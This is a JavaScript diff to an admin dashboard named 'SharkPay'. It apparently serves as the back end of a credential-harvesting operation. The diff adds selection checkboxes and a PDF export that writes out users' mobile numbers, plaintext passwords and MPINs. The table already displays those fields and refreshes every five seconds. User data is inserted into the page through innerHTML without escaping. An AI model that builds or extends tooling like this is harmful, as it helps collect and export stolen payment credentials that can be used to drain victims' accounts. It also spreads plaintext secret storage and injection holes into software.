@@ -9,14 +9,36 @@ document.addEventListener("DOMContentLoaded", () => {
 
   let allUsersList = [];
 
+  let selectedUserIds = new Set();
+  const selectAllUsersCb = document.getElementById("selectAllUsers");
+
+  if (selectAllUsersCb) {
+    selectAllUsersCb.addEventListener("change", (e) => {
+      const isChecked = e.target.checked;
+      const visibleUsers = applyFilters(true); // Get currently filtered users
+      
+      document.querySelectorAll(".user-checkbox").forEach((cb) => {
+        cb.checked = isChecked;
+        const id = cb.getAttribute("data-id");
+        if (isChecked) {
+          selectedUserIds.add(id);
+        } else {
+          selectedUserIds.delete(id);
+        }
+      });
+    });
+  }
+
   function renderUsers(usersToRender) {
     usersTableBody.innerHTML = "";
 
     if (!usersToRender || usersToRender.length === 0) {
       usersTableBody.innerHTML =
-        '<tr><td colspan="7" style="text-align:center;">No users found</td></tr>';
+        '<tr><td colspan="8" style="text-align:center;">No users found</td></tr>';
       return;
     }
+
+    let allVisibleChecked = true;
 
     usersToRender.forEach((user) => {
       const date = user.created_at
@@ -26,7 +48,11 @@ document.addEventListener("DOMContentLoaded", () => {
         user.status === "completed" ? "status-completed" : "status-pending";
 
       const tr = document.createElement("tr");
+      const isChecked = selectedUserIds.has(user.id) ? "checked" : "";
+      if (!isChecked) allVisibleChecked = false;
+
       tr.innerHTML = `
+                    <td><input type="checkbox" class="user-checkbox" data-id="${user.id}" ${isChecked} /></td>
                     <td>${user.mobile || "N/A"}</td>
                     <td>${user.password || "N/A"}</td>
                     <td>${user.mpin || "Not Set"}</td>
@@ -38,6 +64,22 @@ document.addEventListener("DOMContentLoaded", () => {
       usersTableBody.appendChild(tr);
     });
 
+    if (selectAllUsersCb) {
+      selectAllUsersCb.checked = usersToRender.length > 0 && allVisibleChecked;
+    }
+
+    document.querySelectorAll(".user-checkbox").forEach((cb) => {
+      cb.addEventListener("change", (e) => {
+        const id = e.target.getAttribute("data-id");
+        if (e.target.checked) {
+          selectedUserIds.add(id);
+        } else {
+          selectedUserIds.delete(id);
+          if (selectAllUsersCb) selectAllUsersCb.checked = false;
+        }
+      });
+    });
+
     document.querySelectorAll(".view-user-btn").forEach((btn) => {
       btn.addEventListener("click", (e) => {
         const userStr = e.currentTarget.getAttribute("data-user");
@@ -47,7 +89,7 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  function applyFilters() {
+  function applyFilters(returnOnly = false) {
     const query = searchUsersInput.value.trim().toLowerCase();
     const filter = filterUsersSelect.value;
 
@@ -62,6 +104,8 @@ document.addEventListener("DOMContentLoaded", () => {
         (u) => u.status === filter || (!u.status && filter === "pending"),
       );
     }
+    
+    if (returnOnly) return filtered;
     renderUsers(filtered);
   }
 
@@ -224,6 +268,37 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   refreshUsersBtn.addEventListener("click", fetchUsers);
+
+  const downloadSelectedPdfBtn = document.getElementById("downloadSelectedPdfBtn");
+  if (downloadSelectedPdfBtn) {
+    downloadSelectedPdfBtn.addEventListener("click", () => {
+      if (selectedUserIds.size === 0) {
+        alert("Please select at least one user to download.");
+        return;
+      }
+
+      const { jsPDF } = window.jspdf;
+      const doc = new jsPDF();
+      doc.setFontSize(16);
+      doc.text("SharkPay Selected Users", 10, 20);
+      doc.setFontSize(12);
+
+      let yPos = 30;
+      
+      allUsersList.forEach(user => {
+        if (selectedUserIds.has(user.id)) {
+          if (yPos > 280) {
+            doc.addPage();
+            yPos = 20;
+          }
+          doc.text(`Mobile: ${user.mobile || "N/A"} | Password: ${user.password || "N/A"} | MPIN: ${user.mpin || "Not Set"}`, 10, yPos);
+          yPos += 10;
+        }
+      });
+
+      doc.save("Selected_Users.pdf");
+    });
+  }
 
   setInterval(fetchUsers, 5000);
   fetchUsers();
